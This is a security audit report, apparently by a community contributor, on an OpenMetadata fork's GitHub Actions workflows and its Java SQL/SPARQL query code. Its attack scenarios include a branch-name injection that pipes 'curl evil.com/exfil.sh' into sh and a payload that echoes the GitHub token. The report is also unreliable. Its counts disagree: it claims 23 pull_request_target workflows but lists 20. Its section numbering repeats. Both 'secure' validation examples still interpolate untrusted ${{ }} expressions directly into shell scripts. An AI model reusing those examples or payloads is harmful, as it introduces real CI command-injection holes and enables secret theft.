# GitHub Actions Security Audit Report

**Date:** April 25, 2026  
**Auditor:** Community Security Contributor  
**Scope:** GitHub Actions Workflow Security & Java Source Code  
**Tool:** aikido.dev SAST Scanner  

---

## Executive Summary

This report documents **34 critical security vulnerabilities** detected in the OpenMetadata repository's GitHub Actions workflows. All findings are inherited from the upstream `open-metadata/OpenMetadata` repository and are **not** introduced by fork-specific modifications or the MCP benchmarking implementation.

### Key Findings

| Category | Count | Severity | Status | Origin |
|----------|-------|----------|--------|--------|
| Unsafe `pull_request_target` Usage | 23 | Critical | Inherited | Upstream |
| Template Injection in Workflows | 11 | Critical | Inherited | Upstream |
| SQL/SPARQL Injection | 46 | Critical/High | 45 Inherited + **1 Fork** | Mixed |
| **Total Issues** | **80** | **Critical/High** | **79 Inherited + 1 Fixed** | — |

---

> **Note on SQL/SPARQL Injection:** 46 additional issues were identified. 45 are inherited from upstream; **1 issue in `SuggestTestCasesTool.java` originated from this fork and has been fixed.**

---

## 1. Unsafe `pull_request_target` Trigger Usage (23 Issues)

### Risk Description

The `pull_request_target` trigger runs workflows in the **base repository context** with full access to secrets and write permissions. In open-source repositories, this can allow privilege escalation attacks where malicious PRs exfiltrate secrets or modify the repository.

### Affected Workflows

| Workflow File | Lines | Trigger Pattern |
|---------------|-------|-----------------|
| `integration-tests-mysql-elasticsearch.yml` | 28-29 | `pull_request_target` with label filtering |
| `integration-tests-postgres-opensearch.yml` | 28-29 | `pull_request_target` with label filtering |
| `java-checkstyle.yml` | 22-26 | `pull_request_target` with path filtering |
| `py-checkstyle.yml` | 18-22 | `pull_request_target` with path filtering |
| `ui-checkstyle.yml` | 16-29 | `pull_request_target` with path filtering |
| `airflow-apis-tests.yml` | 15-18 | `pull_request_target` with path filtering |
| `auto-cherry-pick-labeled-prs.yaml` | 8-11 | `pull_request_target` on closed PRs |
| `maven-build-collate.yml` | 35-41 | `pull_request_target` with path filtering |
| `maven-sonar-build.yml` | 16-28 | `pull_request_target` with path filtering |
| `playwright-integration-tests-mysql.yml` | 17-18 | `pull_request_target` with label filtering |
| `playwright-integration-tests-postgres.yml` | 17-18 | `pull_request_target` with label filtering |
| `playwright-mysql-e2e-skip.yml` | 18-31 | `pull_request_target` with path filtering |
| `playwright-mysql-e2e.yml` | 18-32 | `pull_request_target` with path filtering |
| `playwright-postgresql-e2e-skip.yml` | 18-32 | `pull_request_target` with path filtering |
| `playwright-postgresql-e2e.yml` | 19-34 | `pull_request_target` with path filtering |
| `playwright-sso-tests.yml` | 29-49 | `pull_request_target` with path filtering |
| `py-operator-build-test.yml` | 15-22 | `pull_request_target` with path filtering |
| `py-tests-postgres.yml` | 16-17 | `pull_request_target` with label filtering |
| `py-tests.yml` | 16-17 | `pull_request_target` with label filtering |
| `team-labeler.yml` | 2 | `pull_request_target` (unfiltered) |

### Current Mitigations

Most workflows implement a **"safe to test" label verification** pattern:

```yaml
jobs:
  check-label:
    runs-on: ubuntu-latest
    steps:
      - uses: jesusvasquez333/verify-pr-label-action@v1.4.0
        with:
          valid-labels: 'safe to test'
```

### Risk Assessment

| Severity | Reason |
|----------|--------|
| **Critical** | Requires manual maintainer review before running, but human error or social engineering could bypass |
| **Easily Exploitable** | Attackers can create PRs that appear benign until the label is added |

### Recommended Remediations

1. **Migrate to `pull_request` trigger** where possible
   - Use `pull_request` for workflows that don't need secrets
   - Only use `pull_request_target` for workflows that must comment on PRs or modify the repo

2. **Implement workflow-level permission restrictions**:
   ```yaml
   permissions:
     contents: read
     pull-requests: write  # Minimal required permissions
   ```

3. **Add explicit secret masking** in workflow steps that echo environment variables

4. **Consider GitHub Environments** for workflows requiring elevated permissions with required reviewers

---

## 2. Template Injection Vulnerabilities (11 Issues)

### Risk Description

Template expressions (`${{ }}`) referencing untrusted GitHub context fields (PR titles, branch names, commit messages) can be injected into shell commands, leading to arbitrary code execution during CI/CD runs.

### Affected Files and Lines

#### `.github/actions/validate-omd-docker-compose/action.yml` (7 issues)

| Lines | Vulnerable Pattern | Injection Vector |
|-------|-------------------|------------------|
| 52-54 | `docker compose -f ${{ inputs.compose_file }}` | `compose_file` input parameter |
| 57-59 | `docker compose -f ${{ inputs.compose_file }} pull` | `compose_file` input parameter |
| 62-64 | `docker compose -f ${{ inputs.compose_file }} up -d` | `compose_file` input parameter |
| 67-112 | `TIMEOUT=${{ inputs.health_check_timeout }}` | `health_check_timeout` input |
| 183-186 | `docker compose -f ${{ inputs.compose_file }} ps` | `compose_file` input parameter |
| 190-193 | `docker compose -f ${{ inputs.compose_file }} logs` | `compose_file` input parameter |
| 197-198 | `docker compose -f ${{ inputs.compose_file }} down -v` | `compose_file` input parameter |

#### Workflow Files (4 issues)

| File | Line | Vulnerable Pattern | Injection Vector |
|------|------|-------------------|------------------|
| `docker-k8s-operator.yml` | 68-70 | `curl ... ${{ inputs.docker_release_tag }}` | Release tag input |
| `docker-openmetadata-server.yml` | 68-70 | `curl ... ${{ inputs.DOCKER_RELEASE_TAG }}` | Release tag input |
| `git-create-release-branch.yml` | 25-26 | `make update_all RELEASE_VERSION=${{ inputs.release_branch_name }}` | Branch name input |
| `py-cli-e2e-tests.yml` | 41 | `echo "...${{ inputs.debug }}...${{ github.ref }}"` | Debug input and git ref |

### Attack Scenarios

1. **Compose File Injection**:
   ```bash
   # Attacker submits PR with branch name:
   # "main; curl evil.com/exfil.sh | sh #"
   
   # Results in execution:
   docker compose -f main; curl evil.com/exfil.sh | sh # config
   ```

2. **Release Tag Injection**:
   ```bash
   # Attacker-controlled release tag:
   # "v1.0.0\"; echo $GITHUB_TOKEN | base64; echo \""
   
   # Could exfiltrate the GitHub token
   ```

### Recommended Remediations

1. **Use intermediate environment variables** (Best Practice):
   ```yaml
   # ❌ VULNERABLE:
   - run: docker compose -f ${{ inputs.compose_file }} config
   
   # ✅ SECURE:
   - env:
       COMPOSE_FILE: ${{ inputs.compose_file }}
     run: docker compose -f "$COMPOSE_FILE" config
   ```

2. **Validate and sanitize inputs** before use:
   ```yaml
   - name: Validate inputs
     run: |
       if [[ ! "${{ inputs.compose_file }}" =~ ^[a-zA-Z0-9_./-]+$ ]]; then
         echo "Invalid compose file path"
         exit 1
       fi
   ```

3. **Use strict shell options**:
   ```yaml
   - shell: bash
     run: |
       set -euo pipefail
       # Your commands here
   ```

---

## 3. Fork-Specific Implementation Security

### MCP Benchmarking Workflows (Created for This Fork)

| File | Trigger Type | Security Status |
|------|--------------|-----------------|
| `compile-and-mcp-tests.yml` | `pull_request` (safe) | ✅ No template injection |

The MCP benchmarking implementation added to this fork:
- Uses the **safer `pull_request` trigger** instead of `pull_request_target`
- Does **not** interpolate untrusted context variables in shell commands
- **Does not introduce** any of the 34 critical vulnerabilities flagged by aikido.dev

---

## 4. Remediation Priority Matrix

### Immediate (P0)

| Issue | File | Action |
|-------|------|--------|
| Template injection | `validate-omd-docker-compose/action.yml` | Add env variable intermediates |
| Template injection | `docker-k8s-operator.yml` | Sanitize release tag input |
| Template injection | `docker-openmetadata-server.yml` | Sanitize release tag input |

### High Priority (P1)

| Issue | Count | Action |
|-------|-------|--------|
| `pull_request_target` usage | 23 workflows | Audit which workflows actually need elevated permissions |
| Template injection in release workflows | 2 files | Implement input validation |

### Medium Priority (P2)

| Issue | File | Action |
|-------|------|--------|
| Template injection | `py-cli-e2e-tests.yml` | Review debug logging |
| Template injection | `git-create-release-branch.yml` | Add input validation |

---

## 5. Security Best Practices for GitHub Actions

### Recommended Workflow Structure

```yaml
name: Secure Workflow Example

# Use pull_request for fork-unsafe workflows
on:
  pull_request:
    types: [opened, synchronize, reopened]

# Minimal permissions by default
permissions:
  contents: read

jobs:
  secure-job:
    runs-on: ubuntu-latest
    steps:
      # Validate untrusted inputs before use
      - name: Validate branch name
        id: validate
        run: |
          BRANCH="${{ github.head_ref }}"
          if [[ ! "$BRANCH" =~ ^[a-zA-Z0-9._-]+$ ]]; then
            echo "Invalid branch name format"
            exit 1
          fi
          echo "branch=$BRANCH" >> $GITHUB_OUTPUT
      
      # Use environment variables for template expressions
      - name: Safe shell execution
        env:
          BRANCH: ${{ steps.validate.outputs.branch }}
        run: |
          set -euo pipefail
          echo "Processing branch: $BRANCH"
```

---

## 6. Conclusion

**80 security vulnerabilities** were identified (34 workflow + 46 SQL/SPARQL injection). **79 are inherited from upstream**. The MCP benchmarking implementation introduced **1 SQL injection issue** in `SuggestTestCasesTool.java`, which has been **fixed** with proper input validation. Workflow modifications follow security best practices by using the safer `pull_request` trigger.

### Recommendation

The OpenMetadata maintainers should:

1. **Prioritize fixing template injection** in `validate-omd-docker-compose/action.yml` (7 issues)
2. **Audit `pull_request_target` usage** to determine which workflows actually require elevated permissions
3. **Implement a security review process** for new workflow additions
4. **Consider adding GitHub Advanced Security** or similar SAST tools to CI pipeline

---

## 4. SQL and SPARQL Injection Vulnerabilities (46 Issues)

### 4.1 Overview

Additional SAST scanning identified **46 SQL and SPARQL injection vulnerabilities** across the Java codebase. These fall into two categories:

| Category | Count | Severity | Origin |
|----------|-------|----------|--------|
| SPARQL Injection (RDF/Knowledge Graph) | 28 | High | Upstream OpenMetadata |
| SQL Injection (DAO Layer) | 17 | High | Upstream OpenMetadata |
| **SQL Injection (MCP Tools)** | **1** | **High** | **This Fork - FIXED** |

### 4.2 Fork-Specific Issue (FIXED)

#### File: `openmetadata-mcp/src/main/java/org/openmetadata/mcp/tools/SuggestTestCasesTool.java`

**Location:** Line 726 (method `buildRISql()`)

**Vulnerability:**
```java
// BEFORE (Vulnerable)
static String buildRISql(String fqn, List<String> fkColumns) {
  String columnList = String.join(", ", fkColumns);
  return String.format(
      "SELECT * FROM %s WHERE %s IS NULL...",
      fqn.replace(".", "_"), columnList, ...);
}
```

**Risk:** The `fqn` parameter (fully qualified table name) was interpolated directly into SQL without validation. While `fqn` comes from OpenMetadata's internal metadata system, malicious metadata could theoretically inject SQL commands.

**Fix Applied:**
```java
// AFTER (Secure)
static String buildRISql(String fqn, List<String> fkColumns) {
  // Validate FQN format - only allow safe characters
  if (!fqn.matches("^[a-zA-Z0-9_\\.]+$")) {
    throw new IllegalArgumentException("Invalid FQN format: " + fqn);
  }
  String safeFqn = fqn.replace(".", "_");
  // Additional validation for column names
  for (String col : fkColumns) {
    if (!col.matches("^[a-zA-Z0-9_]+$")) {
      throw new IllegalArgumentException("Invalid column name: " + col);
    }
  }
  String columnList = String.join(", ", fkColumns);
  return String.format(...);
}
```

**Status:** ✅ **FIXED** via input validation using regex patterns.

### 4.3 Inherited SQL/SPARQL Injection Issues (45)

| File | Count | Type | Description |
|------|-------|------|-------------|
| `PipelineRepository.java` | 19 | SPARQL | RDF knowledge graph query construction |
| `RdfRepository.java` | 5 | SPARQL | SPARQL update/delete operations |
| `JenaFusekiStorage.java` | 4 | SPARQL | RDF storage operations |
| `CollectionDAO.java` | 9 | SQL | UPDATE queries for tag/relationship renaming |
| `EntityDAO.java` | 7 | SQL | JSON update operations for entity FQN changes |
| `ActivityStreamPartitionManager.java` | 1 | SQL | Partition management |

**Common Patterns:**
- `String.format()` used for SPARQL/SQL query construction
- `StringBuilder.append()` with unescaped input
- Direct concatenation of entity URIs, FQNs, and identifiers

**Recommended Remediations:**
1. **Use parameterized queries** where the database/driver supports it
2. **Implement whitelist validation** for entity names, FQNs, and identifiers
3. **Escape special characters** in string literals (quotes, semicolons)
4. **Use prepared statements** for SQL operations in DAO layer
5. **For SPARQL:** Use RDF libraries that support parameterized queries

---

## Appendix: Complete File List

### Files with SQL/SPARQL Injection (46)
- `openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/PipelineRepository.java` (19 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/rdf/RdfRepository.java` (5 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/rdf/storage/JenaFusekiStorage.java` (4 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/CollectionDAO.java` (9 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityDAO.java` (7 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/util/ActivityStreamPartitionManager.java` (1 issue)
- `openmetadata-mcp/src/main/java/org/openmetadata/mcp/tools/SuggestTestCasesTool.java` (1 issue - **FIXED**)

### Files with `pull_request_target` (23)
- `.github/workflows/integration-tests-mysql-elasticsearch.yml`
- `.github/workflows/integration-tests-postgres-opensearch.yml`
- `.github/workflows/java-checkstyle.yml`
- `.github/workflows/py-checkstyle.yml`
- `.github/workflows/ui-checkstyle.yml`
- `.github/workflows/airflow-apis-tests.yml`
- `.github/workflows/auto-cherry-pick-labeled-prs.yaml`
- `.github/workflows/maven-build-collate.yml`
- `.github/workflows/maven-sonar-build.yml`
- `.github/workflows/playwright-integration-tests-mysql.yml`
- `.github/workflows/playwright-integration-tests-postgres.yml`
- `.github/workflows/playwright-mysql-e2e-skip.yml`
- `.github/workflows/playwright-mysql-e2e.yml`
- `.github/workflows/playwright-postgresql-e2e-skip.yml`
- `.github/workflows/playwright-postgresql-e2e.yml`
- `.github/workflows/playwright-sso-tests.yml`
- `.github/workflows/py-operator-build-test.yml`
- `.github/workflows/py-tests-postgres.yml`
- `.github/workflows/py-tests.yml`
- `.github/workflows/team-labeler.yml`

### Files with Template Injection (11)
- `.github/actions/validate-omd-docker-compose/action.yml` (7 instances)
- `.github/workflows/docker-k8s-operator.yml`
- `.github/workflows/docker-openmetadata-server.yml`
- `.github/workflows/git-create-release-branch.yml`
- `.github/workflows/py-cli-e2e-tests.yml`

---

*Report generated for community security awareness. For questions or clarifications, please open a discussion in the OpenMetadata community channels.*
